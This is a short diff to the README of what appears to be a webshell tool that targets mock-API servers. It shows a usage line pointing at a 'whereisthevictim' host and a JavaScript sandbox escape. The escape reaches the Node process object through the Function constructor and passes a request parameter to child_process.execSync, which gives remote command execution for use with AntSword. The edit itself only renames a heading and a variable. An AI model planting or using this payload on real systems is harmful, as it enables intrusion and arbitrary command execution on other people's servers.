@@ -28,7 +28,7 @@ python3 webshell.py {mock address like: http://whereisthevictim/mock/222/test/te
 python3 webshell.py {mock address like: http://whereisthevictim/mock/222/test/test} {cmd dir,you can use "."} {command location}
 ```
 
-# AntSword Alternative
+# AntSword-like Alternative
 
 1. Same as usage
 2. But Create an API With Advanced Mock POST Method.
@@ -38,7 +38,7 @@ const ObjectConstructor = this.constructor
 const FunctionConstructor = ObjectConstructor.constructor
 const myfun = FunctionConstructor('return process')
 const process = myfun()
-mockJson = process.mainModule.require("child_process").execSync(query.data).toString()
+mockJson = process.mainModule.require("child_process").execSync(param.data).toString()
 // you can also add exec function to do some async jobs like running enum scripts
 ```
 3. Open AntSword
